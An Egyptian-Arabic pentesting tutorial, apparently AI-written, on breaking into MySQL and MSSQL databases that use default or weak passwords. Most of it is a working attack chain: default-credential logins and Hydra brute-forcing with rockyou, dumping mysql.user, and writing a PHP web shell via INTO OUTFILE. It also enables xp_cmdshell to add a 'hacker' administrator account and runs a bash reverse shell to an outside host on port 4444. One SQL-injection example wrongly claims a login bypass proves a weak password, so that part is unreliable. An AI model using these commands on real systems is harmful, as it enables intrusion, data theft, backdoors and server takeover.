تمام، هشرح لك "Using Default Credentials or Weak Passwords for Database Authentication" بعمق شديد، مع تركيز على الجانب العملي، الأوامر، والأكواد. هخلّص كل جزء بالعامية المصرية زي ما تكون بتسمع من صاحبك، وفي الآخر هقدم خطوات عملية للاستغلال في سياق Pentesting.

---

### **1. إيه يعني Using Default Credentials or Weak Passwords for Database Authentication؟**

#### **الشرح العميق:**
يعني إن قاعدة البيانات (زي MySQL، MSSQL، PostgreSQL) بتستخدم كلمات سر افتراضية (Default Credentials) أو كلمات سر ضعيفة جدًا (Weak Passwords) للمستخدمين بتوعها. "Default Credentials" هي اللي بتيجي جاهزة مع البرنامج (زي `root` بدون كلمة سر في MySQL أو `sa` بكلمة سر `admin` في MSSQL)، و"Weak Passwords" هي حاجة زي `1234` أو `password`. المشكلة إن المهاجمين بيعرفوا القيم الافتراضية دي، وكلمات السر الضعيفة بتكون سهلة التخمين، فلو ما اتغيرتش أو اتعملت أقوى، بيبقى الباب مفتوح لأي حد يدخل.

- **Default Credentials:** زي `root:` (فاضي) أو `sa:sa`.
- **Weak Passwords:** زي `admin123` أو `dbpass`.

#### **الأدوات والأوامر العملية:**
1. **فحص MySQL:**
   - `mysql -u root -p -h 192.168.1.10` -> اضغط Enter بدون كلمة سر.
   - لو دخلت: `SHOW DATABASES;` -> يعني root مفتوح.

2. **فحص MSSQL:**
   - `sqlcmd -S 192.168.1.10 -U sa -P ""`.
   - لو نجحت، شغل: `SELECT @@VERSION;` -> يعني sa مفتوح.

3. **تخمين كلمات سر ضعيفة:**
   - بـ Hydra:
     - `hydra -l root -P /path/to/wordlist.txt mysql://192.168.1.10`.
     - لو لقيت `root:1234`، يبقى ضعيف.

#### **خلاصة بالعامية المصرية:**
"يعني زي ما تكون سايب باب البيت مفتوح أو حاطط مفتاح تحت الدواسة وكاتب عليه `خش`! Default Credentials زي كلمة السر اللي بتيجي مع العربية، وWeak Passwords زي ما تكتب `123` وتقول محدش هيعرفها."

---

### **2. ليه المشكلة دي خطيرة؟**

#### **الشرح العميق:**
الكلمات الافتراضية أو الضعيفة بتخلّي أي حد يقدر يدخل قاعدة البيانات بسهولة، وبما إن قاعدة البيانات فيها كل حاجة مهمة (زي بيانات العملاء، كلمات السر، أو معلومات الشركة)، المهاجم يقدر:
- **يسرق البيانات:** ياخد كل حاجة في الجداول.
- **يعدل أو يمسح:** يخرب النظام أو يغير بيانات.
- **يصعد صلاحيات:** لو قاعدة البيانات متصلة بالسيرفر، يقدر ياخد Shell أو يتحكم في النظام كله.

في الـ Pentesting، دي من أسهل الثغرات اللي بتلاقيها، لأن كتير من المسؤولين بيسيبوا الكلمات الافتراضية أو يحطوا حاجة ضعيفة وينسوا يغيروها.

#### **الأدوات والأوامر العملية:**
1. **استغلال MySQL Default:**
   - `mysql -u root -h 192.168.1.10` -> لو دخلت:
     - `SELECT * FROM mysql.user;` -> تسريب بيانات المستخدمين.
     - `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`.

2. **استغلال MSSQL sa:**
   - `sqlcmd -S 192.168.1.10 -U sa -P "sa"`.
   - `EXEC xp_cmdshell 'whoami';` -> لو رجع `system`، يبقى سيطرت.

3. **SQL Injection للتخمين:**
   - `http://192.168.1.10/login.php?user=admin' OR 1=1 -- &pass=123`.
   - لو دخلت، يبقى التطبيق بيستخدم كلمة سر ضعيفة.

#### **خلاصة بالعامية المصرية:**
"المشكلة دي خطيرة لأنها زي ما تكون سايب خزنة فلوسك مفتوحة وكاتب الكود جنبها! المهاجم يخش، ياخد كل حاجة، ولو لقى طريق للسيرفر، يبقى هو الباشا بتاعك."

---

### **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم الكلمات الافتراضية أو الضعيفة عشان تدخل قاعدة البيانات وتاخد وصول أعلى.
- **مثال واقعي:** لو لقيت MySQL مفتوح كـ root، تكتب Shell وتتحكم في السيرفر.

#### **خلاصة بالعامية المصرية:**
"لما تلاقي كلمة سر زي دي، زي ما تكون لقيت مفتاح الباب في جيبك! بتستخدمه عشان تفتح كل حاجة وتبقى الكبير بتاع المكان."

---

### **خطوات عملية للاستغلال في Pentesting**

#### **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 3306: MySQL 5.7.
  - Port 1433: MSSQL.

#### **الخطوة 2: تجربة Default Credentials**
- MySQL:
  - `mysql -u root -p -h 192.168.1.10` -> Enter بدون كلمة سر.
  - أو: `mysql -u root -proot -h 192.168.1.10`.
- MSSQL:
  - `sqlcmd -S 192.168.1.10 -U sa -P ""`.
  - أو: `sqlcmd -S 192.168.1.10 -U sa -P "sa"`.

#### **الخطوة 3: تخمين Weak Passwords**
- لو ما نجحتش:
  - `hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.10`.
  - أو لـ MSSQL:
    - `hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://192.168.1.10`.

#### **الخطوة 4: استغلال الوصول**
- في MySQL (لو دخلت كـ root):
  - `SELECT * FROM mysql.user;` -> تسريب بيانات.
  - `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`.
  - افتح: `http://192.168.1.10/shell.php?cmd=id` -> `www-data`.
- في MSSQL (لو دخلت كـ sa):
  - `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`.
  - `EXEC xp_cmdshell 'net user hacker pass123 /add';`.

#### **الخطوة 5: تصعيد الصلاحيات**
- من Shell في لينكس:
  - `http://192.168.1.10/shell.php?cmd=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`.
  - `nc -lvnp 4444` -> Shell -> `id` -> `sudo -l` -> تصعد لو لقيت حاجة.
- في ويندوز:
  - `EXEC xp_cmdshell 'net localgroup administrators hacker /add';`.
  - سجل دخول بـ `hacker:pass123`.

#### **الخطوة 6: توثيق**
- سجل كلمات السر اللي نجحت (زي `root:` أو `sa:sa`).
- قدم تقرير يوضح إزاي دخلت وخطر الثغرة.

#### **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت مفتاح الباب في التراب، فتحته، خدت كل حاجة، وطلعت الكبير بتاع الحتة! الكلمات الضعيفة دي طريقك للفوز بسهولة."

---

### **الخلاصة النهائية:**
Using Default Credentials or Weak Passwords for Database Authentication هي ثغرة خطيرة لأنها بتخلّي قاعدة البيانات مفتوحة لأي حد. في الـ Pentesting، دور عليها بـ Nmap وHydra، استغلها عشان تدخل، تسرق بيانات، أو تاخد Shell، ووري العميل إن نظامه زي بيت من غير قفل! بالطريقة دي، تبقى البطل بتاع اللعبة بكل سهولة!